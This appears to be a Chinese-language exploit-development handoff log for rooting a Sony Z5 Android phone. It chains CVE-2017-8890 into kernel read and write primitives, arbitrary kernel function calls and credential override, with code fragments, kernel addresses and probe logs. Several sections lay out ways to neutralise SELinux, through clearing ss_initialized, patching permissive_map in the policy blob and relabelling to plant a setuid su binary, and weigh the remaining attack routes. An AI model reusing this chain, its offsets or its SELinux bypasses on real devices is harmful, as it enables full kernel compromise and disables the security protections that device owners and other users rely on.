## 0. 给接手者的 60 秒摘要

1. 这条链**已经能拿到 uid 0**，并且已经能**在 Enforcing 状态下把 `su` 装到 `/mnt/su`**（`write` + `chown 0:0` + `chmod 06755` 全部返回 0）。
2. 但"让系统真正进入 permissive"这一步，用的是**自伤式**手法：先把 `ss_initialized` 写 0（让 `security_compute_av` 全放行）→ `setenforce 0` → 再回灌 policy 把 `ss_initialized` 置回 1。
3. 代价是：回灌走的是 `security_load_policy()` 的**"开机首次加载"分支**，`policydb_load_isids()` 把 sidtab **从零重建**，开机以来动态分配的几万个 sid 全部作废。
4. 后果是全局性污染：`/data/system` 下所有 inode 变成"查不到 sid"的 unlabeled → `system_server` 写 settings 失败 → 抛异常 → 崩 → Sony 的 `Do sysrq` → **重启**。相机、SystemUI、`/idd` 遥测的怪病，全是这一个动作的衍生。
5. 之前 probe70~77 里那几百行 relabel 补丁，全是在给这个自伤擦屁股；它能让系统"看起来正常"，但窗口期一踩就炸（23 节那次就是）。
6. **当前主线**：找到一条"不改 sidtab、不回灌 policy"就能拿到 permissive（或等效特权）的路。probe78/79 在做这件事，卡在两个具体点上（见 §9）。

> **"开机我可以手动触发一下 Root，但无论我触发还是不触发，系统功能都应该是正常的。"**

拆成可判定的三条：

| # | 场景 | 判定 |
|---|---|---|
| A | 开机后**不点**任何东西 | Enforcing、无 su、设置/相机/多任务/SystemUI 全正常 |

## 4. 利用链完整原理

### 4.1 漏洞：CVE-2017-8890（Phoenix Talon）

- `setsockopt(SOL_IP, MCAST_JOIN_GROUP, ...)` 加入组播组；
- `inet_csk_clone_lock` / `sk_clone_lock` **没有把 `mc_list` 置 NULL**（上游修复 6548f7e 未 backport），`accept()` 出来的 newsk 与父 socket 共享 `mc_list` 指针；
- 两边都 `close()` → `ip_mc_socklist` 被 `kfree_rcu` 两次 → double free。

本机化之后没有走"堆喷 double free"那条常见路，而是用它做出了更稳的原语，见下。

### 4.2 任意读：`ip_mc_msfget`

```c
psl = pmc->sflist;
copy_to_user(&optval->imsf_slist[0], psl->sl_addr, copycount * 4);
```

`struct ip_sf_socklist` 布局：`sl_max@0`、`sl_count@4`、`rcu@8`、`sl_addr[]@24`。

→ 把 `sflist` 设成 `target - 24`，`copy_to_user` 就把 `target` 起的内存送到用户态。实测一次能读 0xc0。

### 4.3 条件写：`ip_mc_source`（**这是当前最大的瓶颈，务必读懂**）

实现（probe79s.c 的 `kwrite`）：

```c
static long kwrite(u64 W, u32 val, u32 *out_k)
{
    if (kread_at(W - 0x40, 0x40) != 0x40) return -1000;   // 先把 W-0x40..W 读回来
    for (int k = 0; k <= 9; k++) {
        u64 S = W - 24 - 4 * k;        // 假 ip_sf_socklist 的位置
        u32 mx = *(u32 *)(p + off);    // sl_max
        u32 ct = *(u32 *)(p + off + 4);// sl_count
        if (ct != (u32)k) continue;    // ★ 必须恰好等于 k
        if (mx == (u32)k) continue;    // ★ 且不能等于 k
        *(u64 *)(P_FAKE + 24) = S;     // pmc->sflist = S
        setsockopt(IP_BLOCK_SOURCE, {multiaddr, ifindex=1, val}, 12);
        return r;
    }
    return -2000;                      // 一个锚点都没有
}
```

三个硬约束：

1. **锚点约束**：目标地址前 24~60 字节内，必须存在某个 4 字节处 `sl_count == k`（k ∈ 0..9）且 `sl_max != k`。
   - 数据段/代码段里大量是 `0xffffffc0xxxxxxxx` 这种大数，`u32` 高位永远不是 0..9 → 找不到锚点 → 返回 `-2000`。
   - **`selinux_enforcing`（0xffffffc00187d47c）附近一个锚点都没有**，这就是"直写 enforce 变量"一直失败的原因（probe78 实测 `KW w fffff830 k 000000ff`）。
2. **一次性**：写入后 `sl_count++`，把原来的锚点自己吃掉；同地址在同一 boot 内基本只能写一次。
3. **单次只写 4 字节**：现在传 1 个 source address。理论上传 N 个可以一次写 4N 字节（`IP_MSFILTER` / 多个 source 会连续 append），**这条还没试**——它是路线 C 的钥匙，见 §10。

`ss_initialized`（0xffffffc001880b18）**恰好**有一个可用锚点（k=0，`sl_max=0x00800002`、`sl_count=0`），所以它能被写一次 —— 这也是为什么整条链只能靠它开门。

### 4.4 任意内核函数调用

`kfree_rcu(ptr, rcu)` → `call_rcu(&ptr->rcu, offset_to_func)`，`__rcu_reclaim`：

```c
offset = head->func;
if (offset < 4096) kfree(head - offset);
else               head->func(head);      // ★ 单参数任意调用
```

参数就是 `head` 本身，所以我们把 `head` 指到一块**用户页里的 fake cred**，`func` 填 `override_creds` → 一次回调就完成提权。

注意：`override_creds` 里的 `ldxr w3,[x0]` 要求地址 4 字节对齐，所以 fake cred 必须对齐（用 `sflist` 的 rcu_head 而不是 `multi` 那块，见 §5）。

### 4.5 提权：为什么是 `override_creds` 而不是 `commit_creds`

`commit_creds` 开头有：

```c
cmp x19, x0          ; task->cred vs task->real_cred
b.eq ...
brk #0               ; 不等就 BUG()
```

只要 `cred != real_cred` 就 BUG。而 `override_creds` 只做 `atomic_inc(new->usage)` + `task->cred = new`，**没有任何检查**。

代价：`real_cred` 不变，所以 `/proc/PID/status` 里的 `Uid:` 永远是 2000 —— 这一点曾经让我们把一次**成功的提权**误判成"卡死"（24.3 节）。

### 4.6 三种日志通道（为什么需要三种）

提权瞬间 `cred->security` 变成 `u:r:kernel:s0`，在 Enforcing 下：

- `write(1, ...)` 写 stdout → `-EACCES`（avc 记 `fd: use`）
- `write(step_fd, ...)` → 同上
- `msync(rep.bin)` → 同上

于是"WON 之后日志全断"不是流程断了，是**通道断了**。三层保底：

| 通道 | 何时用 | 原理 |
|---|---|---|
| stdout / `rep.bin` | 提权前 | 普通 write |
| `step.txt` | 提权前开 fd，提权后不再写 | fd 在 open 时已过检查；硬复位后文件仍在 |
| **共享匿名页 + fork 抄写员** | 提权后**唯一**可靠 | 父进程只做纯用户态 store，子进程保留干净的 shell cred 每 50ms 落盘 |

共享页：`mmap(0x0b000000, 0x20000, MAP_SHARED|MAP_ANON|MAP_FIXED)`，头 16 字节是 `{offset, seq}`。
提权后**必须**把 `g_sp`（step fd）、`g_rp`（rep 映射）置 -1/0，否则每次写都往 audit 里塞一条记录 → `audit_lost` 爆炸 → 硬复位。

## 6. SELinux 死结：三段式与它的代价

### 6.1 为什么必须让 `ss_initialized = 0`

`sel_write_enforce()` 的门槛是：

```c
if (new_value != selinux_enforcing) {
    length = task_has_security(current, SECURITY__SETENFORCE);
    if (length) goto out;                  // -EACCES
    selinux_enforcing = new_value;
}
```

`task_has_security` 走 `avc_has_perm`。而 `avc` 的关键两点：

- `avc_denied()`：`if (selinux_enforcing && !(flags & PERMISSIVE)) return -EACCES;`
- `security_compute_av()`：`if (!ss_initialized) goto allow;` → `avd->allowed = 0xffffffff;`

所以想写 `enforce`，必须先让 `ss_initialized = 0`（全放行），**并且**换一个从没在 avc 里出现过的 sid（`avc_search_node` 只按 `(ssid,tclass,tsid)` 匹配，**不校验 seqno**，旧判决会一直生效）。

probe55/57 实证成功的顺序：

```
读 /sepolicy（307380 字节，提权前读，普通文件不走 security_* hook）
kwrite(ss_initialized, 0)          ← 唯一一次 4 字节写，用掉 k=0 锚点
write("/sys/fs/selinux/enforce","0")  ← 成功，selinux_enforcing=0
write("/sys/fs/selinux/load", blob)   ← 让内核自己把 ss_initialized 置回 1
```

### 6.2 代价：`policydb_load_isids()` 把 sidtab 从零重建

`security_load_policy()`：

```c
if (!ss_initialized) {              // ← 我们清成 0 了，走这里
    policydb_read(&policydb, fp);
    policydb_load_isids(&policydb, &sidtab);   // ★ sidtab 重建
    ss_initialized = 1;
    ...
}
/* 正常路径（ss_initialized==1）走的是：
   sidtab_shutdown + sidtab_map(clone) + sidtab_map(convert_context)
   —— 编号全部保留，这才是内核热更新策略不出事的原因 */
```

重建后只保留 policy 里那几十个 initial sid，**开机以来动态分配的几万个 sid 全部作废**。于是：

所有 inode / 进程身上的旧 sid 都 `sidtab_search()` 不到
→ 全系统"unlabeled"假象
→ `system_server` 写 `/data/system/users/0/settings_system.xml` 被拒
→ `SettingsState.doWriteState` 抛 `IllegalStateException`
→ system_server 崩 → Sony force dump → `I/ActivityManager: Do sysrq` → **内核重启**

**这一条解释了之前所有的"怪病"**：

- `/data/system` 污染、`Couldn't create directory` 刷屏
- 相机 `Fail to get camera info`（`/data/misc/camera` 目录 unlabeled，`cam_socket0/1` 继承父目录标签，`mm-qcamera-daemon` unlink 被拒）
- SystemUI 崩溃循环
- `Unable to backup user packages state file`
- `/idd` 每秒几十条 avc

### 6.3 为什么这是死结

```
要 permissive              → 必须 ss_initialized=0
ss_initialized 要恢复成 1  → 只能走 security_load_policy 的 initial 分支
initial 分支               → sidtab 重建（不可逆，本 boot 内）
sidtab 重建                → 全系统 unlabeled → system_server 崩 → 重启
```

而"擦屁股"（relabel 十万个 inode）不现实，而且**窗口期内随时可能踩雷**——23:22 那次就是在 relabel `/data/system` 的几秒里被 system_server 撞上了。

另外两个死结细节：

- `security_read_policy()` 要求 `ss_initialized==1`，所以策略 blob 必须在清零**之前**读（从 `/sepolicy` 读，不走 hook）。
- 提权后 `mmap` 一律 `-EACCES`，所以所有大缓冲必须在**提权前**建好。

## 7. 决定性实验证据（原文摘录，probe78 共享页日志）

```
== probe78 run, pid 00001615
R00000001 00000000 00000000 s0c000708     ← 第一次触发 setsockopt 全返回 0
G u 00000000 n 0c000709                   ← RCU 回调已执行，getuid()==0
WON 00000001 tr 00000001 U 00000000       ← 赢，且只触发一次就赢
X sid 00000025 ef 000001fa w fffffff3 rd 00000001 v 1   ← init 域写 enforce: EACCES
X sid 00000001 ef 000001fa w fffffff3 rd 00000001 v 1   ← kernel 域: 也是 EACCES
KW w fffff830 k 000000ff                  ← kwrite(selinux_enforcing) 无锚点 (-2000)
S5 won ffffffff
J ro 00000000
H ofd 000001fa
H written 00000360                        ← 864 字节 su 写进 /mnt/su 成功
H chown 00000000 chmod 00000000           ← chown 0:0 / chmod 06755 都成功
H verify fd 000001fa sz 00000360
```

四条硬结论：

1. **竞速没失败**，第一次触发就赢了。之前多次"连续 N 次失败"多半也是赢了但看不见。
2. `init`(0x25) 和 `kernel`(1) 两个域**都没有** `security:setenforce`。
3. `kwrite(selinux_enforcing, 0)` **没有锚点**，直写 enforce 变量的路走不通。
4. **但在 Enforcing 下、kernel 域 + 全 caps 就能把 su 装好** —— "装 su" 和 "变 permissive" 是两件独立的事。

第 4 条是整份文档里最有价值的一句话：**也许根本不需要 permissive。**

## 9. 未解决的核心问题（写成可判定问题）

**Q1｜有没有一个 SELinux 域，在 `ss_initialized==1` 的正常状态下带 `security:setenforce`？**
- 判定：probe79 输出里出现 `C won <n>`（n ≥ 0）且同一行 `v 0`。
- 已排除：`init`、`kernel`。
- 待试：`su / shell / system_server / dumpstate / root / vold / installd / zygote`（代码已就绪）。
- 若全失败 ⇒ Q1 答案是否，路线 A 死。

**Q2｜能不能用一次写原语写 8 字节（或更多）？**
- 动机：把 `security_ops`（0xffffffc00187bc18）从 `selinux_ops` 改成 `default_security_ops`（0xffffffc001645898），全系统 SELinux 检查退化成纯 capability ⇒ **等价 permissive，且完全不动 sidtab**。
- 难点：8 字节指针要两次 4 字节写，且两次都要各自命中的锚点；bss 附近大概率没有。
- 破法：`ip_msfilter` 一次传 N 个 source，内核连续 append 4N 字节（`sysctl_igmp_max_msf=10` ⇒ 最多 40 字节），条件是锚点的 `sl_max >= k+N`。
- 判定：写一个只读探针，`kread` 把 `security_ops-0x60 .. +0x10` 全 dump 出来，人工检查 40 字节内是否存在 `u32 ∈ 0..9`。

**Q3｜不提权也可以吗？**
- 已验证一半：Enforcing + kernel 域 + 全 caps 能写 su、chown、chmod。
- 未验证：kernel 域进程能否 `socket(AF_UNIX, SOCK_STREAM)` + `bind("/dev/socket/...")` + `fork`/`execve` + 读 `/data/data`。
- 若全可以 ⇒ 路线 B（root 代理守护进程）成立，**完全不需要 permissive**，零污染，直接满足验收标准。

## 10. 六条候选路线与评估

### 路线 A｜换域找 setenforce（probe79，代码已就绪）

- 原理：`/proc/self/attr/current` 让内核自己做 `context → sid`，绕过 sid 猜测。
- 代码：`probe79s.c`，10 个候选域逐个 `setcon` → 写 enforce → 读回。
- 成本：**极低**（已编译，只差跑）。
- 风险：可能一个域都没有（Android 6 里通常只有 `init` 有 `allow init self:security setenforce`，而我们已经知道 init 没有）。
- 我的判断：**成功率 < 30%**，但必须跑，因为成本最低。

### 路线 B｜彻底放弃 permissive，做 kernel 域 root 代理（**推荐优先验证**）

- 依据：§7 第 4 条 —— su 在 Enforcing 下就能装好。
- 架构：
  ```
  exploit 提权 (kernel 域 + init_cred 全 caps) → 不退出
    → fork 常驻子进程，bind /dev/socket/z5d，监听命令
    → 客户端 su 把 argv 发过去，守护进程 fork+exec，回传 stdout
  ```
- 优点：**不动 SELinux 任何状态 ⇒ 零污染 ⇒ 系统全程正常**，正好是用户的验收标准；重启即恢复。
- 待验证（半天内可测完）：
  1. kernel 域能否 `socket(AF_UNIX)` + `bind`
  2. kernel 域能否 `execve` 且子进程能正常运行
  3. kernel 域能否读 `/data/data/*`、写 `/data/system`
  4. 进程被 LMK 杀掉时是否 panic（`exit_files` → `ip_mc_drop_socket` 会对用户页 fake pmc 做 kfree，必须 `oom_score_adj=-1000` + `setsid`）
- 缺点：这不是"真 su"，某些依赖 permissive 的场景（Xposed、部分模块）不适用；但对"能用 root 干活"够了。

### 路线 C｜改 `security_ops` 指针（最优雅，前提是 Q2 成立）

- 把 `security_ops` 指向 `default_security_ops` 或一张全 0x... 的假表。
- 好处：全局 bypass，**零污染**，比 permissive 还干净。
- 卡点：8 字节写（Q2）。

### 路线 D｜一次写 4N 字节（解锁 C 的技术）

- 把 `kwrite` 扩成 `kwrite_n(W, vals[], n)`，用 `IP_MSFILTER` 一次 append n 个地址。
- 若锚点 `sl_max >= k+n` 成立，就能一次写 8/12/40 字节。
- 这是**唯一能同时解决 C 和"改任何指针"的技术**，值得单独做一个探针。

### 路线 E｜不回灌 policy 的其他收尾

- 不清 `ss_initialized`，改用 RCU 任意调用直接调 `selinux_complete_init()`（0xffffffc0003ff578）？——不行，它不设 `ss_initialized`。
- 用 RCU 调 `avc_ss_reset`？——只是清缓存，不改判定。
- 结论：**只能靠 `security_load_policy` 那条路**，所以 E 死。

### 路线 F｜接受污染，把窗口压到最小

- 先 relabel 完，再清 `ss_initialized`（顺序反过来）。
- 问题：relabel 需要 permissive 吗？不需要（kernel 域 + 全 caps 就能 `lsetxattr`），**但 relabel 本身不影响 inode 的 sid**（sid 存在 `i_security`，setxattr 会更新，见下）。
- 实测过的教训：`is_unlabeled()` 判据失灵，必须强打；`/data/data` 全树会打死。
- 结论：**只能作为兜底，不适合作为主线**。

### 12.4 竞速与重试

- 成功率约 **3/4**；失败有两种：早期 panic（**无害**，未触碰 `ss_initialized`）、或卡在竞速循环（**必须重启**，同 boot 重试无效）。

## 14. 操作禁忌（血泪）

1. **别在 root 生效期间强停/重装 App** —— 持 UAF 的进程被杀 → `exit_files` → `ip_mc_drop_socket` → 对用户页 fake pmc 做 `kfree` → panic。要重装先重启。
2. **别跑 `/data/data` 全树遍历** —— 十万级 avc → audit backlog 爆 → 整机硬复位，内核一条日志都没有。
3. **`su -c` 只吃一个参数** —— 复杂命令必须写脚本再 `su -c /path/script.sh`。
4. **`su` 的 capability bounding set 只有 0xc0**（SETUID|SETGID），没有 `CAP_DAC_OVERRIDE`，所以 `su` 连 `/data/misc/camera`（0770 camera:camera）都 stat 不了；这类修复只能由 exploit 进程做。
5. **提权后不要再做任何"顺手"的系统调用** —— 每一次被拒都是一条 audit，累积到临界就硬复位。
6. **`adb push` 之后一定 `md5sum`** —— 偶发 0 字节。
7. **同一 boot 内重试竞速无效** —— 失败就重启，别硬耗。

> **致复审者**：本章是对另一份外部评审（`Z5-Root-复盘与路线建议.md`，8 条待验证 + 路线 G）

### 17.1 本轮新增的两样硬资产

**（1）`/sepolicy` 已拉到本地** —— `dump/sepolicy`, 307380 字节。
`-rw-r--r--`，`adb pull` 即可，**不需要 root、不需要跑竞速**。

**（2）`/sys/fs/selinux/access` 存在但不可用** —— 设备上权限 `rw-rw-rw-`（0666），
本以为能直接向内核查询"域+类+权限"的判定结果，但试了 4 种格式
（带/不带换行、单权限/`{ }` 多权限、`file`/`security` 类）**全部返回 `EINVAL`**。
这个 Sony 内核的 access 节点格式与上游 4.x 不同，**这条路封死**。

### 17.2 补正 §3 的一处不精确：写原语的锚点条件

§3 只说"4 字节 + 锚点 + 一 boot 一次"，不够精确，会误导路线评估。准确条件是：

```
目标地址 W，尝试 k = 0..9：
    S = W - 24 - 4k                      // 假 ip_sf_socklist 起点
    要求 *(u32*)(S+4) == k               // sl_count 必须恰好 == k
    要求 *(u32*)(S)   != k               // sl_max 不能 == k（避开 realloc 分支）
    则 sl_addr[k] 正好落在 W，写入成功
若 k 全不满足 → 返回 -2000
```

即：**目标地址前 24~60 字节内，必须存在某个 4 字节处 `sl_count ∈ {0..9}`**。
`.bss`/`.data` 里的全局变量基本都是 `0xffffffc0...` 大指针，所以**绝大多数全局变量写不了**。
`ss_initialized` 能写，纯粹是撞上了 `sl_max=0x00800002 / sl_count=0` 的巧合。

**两个还没试的可能性**（影响后续所有路线评估）：
- `ip_msfilter` 一次传 N 个 source，内核会连续 append 4N 字节
  （`sysctl_igmp_max_msf = 10` → 最多 40 字节）→ 理论上能一次写 8 字节指针甚至一整张表。
- 锚点选择可以做成**运行时自适应**：先 `kread` 目标附近 64 字节（读是稳的），
  再决定 k。这消除了"离线扫镜像"的必要性（见 17.3-E2）。

**逐条说明（关键的 4 条）**

**(C.2) 缓解手段是错的，坑比原评审想的更深。**
原评审说"若 nf hook 开头有 `if (!selinux_enabled) return NF_ACCEPT;`，配合
`selinux_enabled=0` 可拆雷"。实测**没有这个守卫**：
`hooks.c:6081 selinux_nf_ip_init()` 只在**注册时**看 `selinux_enabled`，hook 本体不检查。
且致命的是这一行：

```c
/* hooks.c:4843  selinux_ip_postroute_compat() */
struct sock *sk = skb->sk;
if (sk == NULL) return NF_ACCEPT;
sksec = sk->sk_security;
...
if (selinux_xfrm_postroute_last(sksec->sid, skb, &ad, proto))   /* 4870 行 */
```
`sksec->sid` 是**函数实参，必然求值**。换掉 `security_ops` 之后，
**新建** socket 的 `sk_security` 是 NULL → 第一个 IPv4 包就 oops。
system_server 每秒都在建 socket。→ **路线 C 必须同时拆 nf hook，否则必崩。**

**(G-2) 机制写错，但方向是对的，而且改对后更好。**
3.10 **没有** `TYPE_FLAGS_PERMISSIVE`：`struct type_datum` 只有
`{value, bounds, primary, attribute}`（`ss/policydb.h`），没有 flags 字段。
**但等价能力存在，只是换了地方**：

```c
/* ss/services.c:1096  security_compute_av() */
if (ebitmap_get_bit(&policydb.permissive_map, scontext->type))
        avd->flags |= AVD_FLAGS_PERMISSIVE;

/* avc.c:1049  avc_denied() */
if (selinux_enforcing && !(avd->flags & AVD_FLAGS_PERMISSIVE))
        return -EACCES;          /* 有 flag → 不返回 EACCES → 允许 */
```
`permissive_map` 在 `ss/policydb.c:2385` 读入，条件是
`policyvers >= POLICYDB_VERSION_PERMISSIVE`，而 `include/security.h:30` 定义该值为 **23**。
设备策略 `policyvers = 30` → **这个机制是活的**。

**(E.2) 前提是错的，离线锚点普查会得出错误结论。**
`file dump/kimg.bin` = `Linux kernel ARM64 boot executable Image` —— 这是**启动镜像**，
不是运行时内存快照。证据：
```
security_ops 处(u32) = 0            运行时必然是 0xffffffc001649388
selinux_ops 的 name 字段 = 全 0      运行时必然是 "selinux"
指向 selinux_ops 的 8 字节指针全文件只出现 1 次，位于 0x0f591b0（.rodata）
0x1649000-0x164a000 整 4KB 全 0      .data 之后是洞
```
`.bss` 在文件里是 0，运行时全是大指针 —— **两者锚点几何完全不同**。
（唯一自洽的一条：`ss_initialized` 在文件里正好有 k=0 锚点
`sl_max=0x00800002 / sl_count=0`，与实测"能写一次"吻合，可作扫描器逻辑的交叉验证。）
→ 结论：锚点必须**现场 kread**，不能离线普查。

**(D.4-1) 推理链有漏洞，Q 仍未决。**
"init 必然有 load_policy，否则起不了机"不成立：开机那次 load 发生时
`ss_initialized == 0`，而 `security_compute_av()` 一进来就
`if (!ss_initialized) goto allow;`（`ss/services.c:1085`）——
**权限检查根本没走到策略判定**，直接全放行。所以"能开机"不能证明任何域有 load_policy。

### 17.4 新事实：`/sepolicy` 的精确结构（本轮实测，可直接复用）

按 `policydb.c: policydb_read()` 逐字段核对：

```
offset  size  字段          值
0x00    4     magic         0xf97cff8c        ✓ POLICYDB_MAGIC
0x04    4     len           8                 ✓ strlen("SE Linux")
0x08    8     str           "SE Linux"
0x10    4     policyvers    30                ✓ ≥ 23，permissive_map 生效
0x14    4     config        1                 (含 MLS 位；设备 /sys/fs/selinux/mls = 1)
0x18    4     sym_num       8                 ✓ 8 张符号表（含 levels/cats）
0x1C    4     ocon_num      7
0x20    24    policycaps    {mapunit=64, highbit=64, count=1} + node{startbit=0, map=0x3}
0x38    12    permissive_map {mapunit=64, highbit=0, count=0}   ★ 空表
0x44    ...   symtabs...
```

**ebitmap 二进制格式**（新增确认，`ss/ebitmap.c: ebitmap_read`）：

```
header: u32 mapunit (=64) | u32 highbit | u32 count          // 12 字节
node  ×count: u32 startbit | u64 map                          // 12 字节/节点
```

原始字节实测（可直接对照）：
```
policycaps      @0x20  40000000 40000000 01000000 | 00000000 03000000 00000000
permissive_map  @0x38  40000000 00000000 00000000
```

**→ 加 permissive 只需把 0x38 处 12 字节换成 24 字节，后面整体后移 12 字节。**
因为 `policydb_read` 是**纯顺序流式读取**（`next_entry`），不依赖任何绝对偏移；
且 12 是 4 的倍数，不破坏后续对齐。**这是本轮最重要的可执行发现。**

`policycaps = 0x3`（bit0|bit1 置位）对路线 C 有意义：原评审担心的
`selinux_ip_postroute` 的 compat 分支，在 policycap 开启时可能走非 compat 路径，
那条路径在 `!secmark && !peerlbl` 时提前 `NF_ACCEPT` —— 也许能躲开上面那个 oops。
但这是**概率，不是保证**。

### 17.5 路线 G 修正版：类型级 permissive（目前最优）

| 环节 | 源码 | 结论 |
|---|---|---|
| 写 load 节点的权限检查 | `selinuxfs.c:519` `task_has_security(current, SECURITY__LOAD_POLICY)` | **没有** `ss_initialized` 前置判断 |
| 其他前置条件 | `selinuxfs.c:524-539` | `*ppos==0`、`count ≤ 64MB`、vmalloc+copy_from_user |
| reload 分支（`ss_initialized==1`） | `services.c:2047-2093` | `policydb_read(new)` → `policydb_load_isids(newsidtab)` → `sidtab_shutdown(old)` → `sidtab_map(clone_sid)` → `sidtab_map(convert_context)` |
| sid 编号 | 同上 `clone_sid` | **全部保留**，所有 inode/进程的 sid 继续有效 |
| 打标签 | — | hooks 不断、sidtab 不换号 ⇒ `inode_init_security` 照常写 xattr |
| 判决粒度 | `services.c:1096` + `avc.c:1049` | 只有 `scontext->type ∈ permissive_map` 的域被放行，**其余域仍 Enforcing** |
| 回滚 | — | 补丁只在内存，磁盘 `/sepolicy` 未动，重启即复原，**零残留** |

**为什么它比原评审评估的更好**：它给的是**类型级 permissive**，不是全局 permissive。
system_server / 相机 / 其他 App 的判定**完全不受影响**；而且**内核写次数 = 0**
（唯一一次写是内核自己把 blob 读进去），彻底绕开"4 字节 + 锚点"这个卡了两天的瓶颈。

**代价（必须承认）**：它是"init **类型**全放行"，不是"仅我们这个进程放行"。
真 init 进程的所有拒绝也会被允许。风险评估见 §17.8-Q2。

### 17.6 路线 C 降级理由

不是因为"不可行"，而是**成本已经超过 G**：
- 需要 2 次独立的内核改动：① 换 `security_ops` 指针（4 字节写，但需锚点）；
  ② 摘掉 nf hook（要改 nf 注册链表，且 system_server 有活跃连接，时序敏感）；
- 一旦漏拆某个 hook 就 oops → 硬复位，**失败模式是灾难性的**（对比 G 失败只是 -EACCES）；
- 而 G 只需要"一个能写 load 节点的域"，且失败无害。

**降级为备选**，复活前提：连同 nf hook 一起拆，且先在已提权会话里验证
`selinux_ip_postroute` 实际走的是哪条分支。

### 17.7 路线 B（彻底不要 permissive）已经变成可行选项

probe78 的硬证据（§7）已经证明：**Enforcing + kernel 域 + 全 caps** 就能
`open("/mnt/su")` + `write` 864 字节 + `chown 0:0` + `chmod 06755` 全部返回 0。

也就是说：**"装 su" 和 "变 permissive" 是两件独立的事**，前者**已经不需要** permissive。
如果 L1 验收（一键 root + 系统正常）只需要"装 su 并让 adb/root shell 能用"，
**那根本不需要 G，也不需要 C** —— 直接用现在的 probe78 形态就能交付，
零污染、零 relabel、零 permissive。

**这是本轮第二个重要结论**：过去两天所有的自伤（清 `ss_initialized` + relabel）
严格来说是**为了一个可能并不需要的目标**而做的。所以 §17.8-Q3 必须回答：
"L1 的最小能力集到底是什么"。

### 17.8 请裁决的五个问题

**Q1 —— 路线 G 的入口门，先解析策略还是先做行为实验？**

我判断**行为实验性价比高一个数量级**，请复核这个"零风险"论证：

实验设计：提权后（不走 `setenforce`，不去碰 enforce 文件），直接把
**原版 307380 字节 blob 原样写回** `/sys/fs/selinux/load`。

- 若 `task_has_security` 拒绝 → 只返回 `-EACCES`，**不改任何内核状态**；
- 若 `policydb_read` 失败 → 直接返回，**不碰 sidtab**；
- 若成功且 `ss_initialized==1` → 走 reload 分支，同策略热重载，
  sidtab 全部 `clone_sid` + `convert_context`，**编号保留**。

三头都安全。成本 = 一次竞速（约 10 分钟）；而写一个能走完 symtabs + avtab 的

**请指出的漏洞**：（a）同策略 reload 时 `convert_context` 会不会因为
`permissive_map` 为空而异常？（b）`avc_ss_reset` 会不会清空 avc，

**Q2 —— permissive_map 的粒度风险可接受吗？**

这是**类型级**而非**进程级**。真 init 进程的拒绝也会被全部允许。

- 这在 user 版策略里算不算过大的权限面扩张？
  （真 init 行为固定：mount、拉起服务、chown，放宽它是否基本无害？）
- 有没有更细的选择：策略里是否存在某个**低风险、当前无进程使用**的域？
- **审计量**：permissive 只让 `avc_denied` 返回 0，`avc_audit` 仍会记录（`permissive=1`）。
  若 init 域拒绝量很大，会不会又把 audit backlog 打爆？
  （第 19 节的**整机静默硬复位**就是 audit 洪水造成的，这是硬教训，必须评估）

**Q3 —— L1 的最小能力集是什么？**

1. 写 `/mnt/su` + chown + chmod 06755 —— ✅ 已实证不需要 permissive；
2. `su -c` 执行任意命令 —— 需要 su 二进制本身的域被允许做什么？

3. 读 `/data/data/*` 各 App 私有数据 —— 需不需要？

**Q4 —— 若走 C，最小拆解方案是什么？**

**Q5 —— 有没有我们完全没看到的第四条路？**

### 18.2 我认账的四条（含机制确认）

§22 的验收全程在 permissive 窗口内跑（probe77 三段式之后系统一直 permissive），
而 probe78 形态全程 Enforcing。两者对 su 的检验完全不是一回事：

**(H.6) 成立，C 死了。**
`nf_hooks[NFPROTO_NUMPROTO][NF_MAX_HOOKS]` 是 `list_head` 数组、未初始化 → `.bss`；
`nf_hook_slow`（`net/netfilter/core.c:170`）直接 `nf_iterate(&nf_hooks[pf][hook], ...)`，
遍历时对 `elem->hook` 无 NULL 检查。所以「置 NULL」会 call 到 0，
「摘链表」要写 .bss，两条都堵死。**维持降级，理由升级为结构性不可行。**

**(H.7-b) 成立，我逐行确认了机制。**
`probe79s.c` 第 10~11 行的注释就是这件事的原始设计：
```
// kfree_call_rcu 会把 head->func 写成 8 —— 那正好写在我们的用户页里,
// 用户态随后可以把它改成任意内核函数指针 => __rcu_reclaim 走 head->func(head)。
```
即 `head->func(head)`：`func` 从 `head` 指向的内存读（可控，因为 head 是用户页），
但**参数恒等于 head 自身的地址**（用户页地址）。要让参数等于内核代码地址，
就得让 head 等于代码地址，那样 `head->func` 读的是代码段字节、不再可控——**套娃无解**。
你的论证正确，`set_memory_rw` 组合不成立。b 撤回。

### 19.1 K.1 核验：GLM 对了一半，错的那一半刚好是致命的

GLM 说"/data/local/tmp 本体就是落点，shell_data_file 正是 shell 域的官方 execute 类型"。
前半完全正确，而且我用两条独立证据坐实了：

```
$ ls -Zd /data/local/tmp
drwxrwx--x shell shell u:object_r:shell_data_file:s0
$ ls -lZ /data/local/tmp/p78
-rwxr-xr-x shell shell u:object_r:shell_data_file:s0 p78      ← 我们跑了它几十次

**但它漏了 nosuid。** 同一台设备、同一个 `/proc/mounts`：

```

### 19.4 事实二：probe78/79 用的 `INIT_SID = 0x25` 是错的，init 是 **7**

`kernel-exact/security/selinux/include/initial_sid_to_string.h`

**`SECINITSID_INIT = 7`。**

而 probe78 的 `set_tsec(CRED, FAKE_TSEC, INIT_SID, INIT_SID)` 传的是 `0x25 = 37`。

（probe79 的 `u:r:su:s0` 也确实不存在——解析器里 `su` 类型名 `ABSENT`，

### 19.5 事实三（★ 本轮最重要）：relabel 链条完整闭合，且不需要 permissive

这是顺着 K.1 的方向挖出来的。三条 avtab 记录拼在一起：

```
# 1. init 在 /mnt(tmpfs) 下创建文件，标签自动变成 init_tmpfs
type_transition  init -> tmpfs : file  =>  init_tmpfs

# 2. init 对 init_tmpfs 有完整控制权
init -> init_tmpfs : file : create,getattr,open,read,relabelfrom,relabelto,setattr,unlink,write

# 3. init 可以把它改成 shell_tmpfs
init -> shell_tmpfs : file : create,getattr,open,read,relabelfrom,relabelto,setattr,unlink,write

# 4. shell 对 shell_tmpfs 有 execute
shell -> shell_tmpfs : file : execute,read,write

# 5. init 对 /mnt 目录本身是全权
init -> tmpfs : dir : add_name,create,getattr,ioctl,mounton,open,read,
                      relabelfrom,remove_name,rename,reparent,rmdir,search,setattr,write
```

配上 19.1 的 `/mnt` 无 nosuid，**五个条件全部满足**：

| 需求 | 满足者 | 证据 |
|---|---|---|
| 能创建文件 | init | `init -> tmpfs:dir create` |
| 能写内容 | init | `init -> init_tmpfs:file write` |
| 能设 setuid 位 | init | `init -> init_tmpfs:file setattr` |
| 能被 shell 执行 | 改成 shell_tmpfs | `shell -> shell_tmpfs:file execute` |
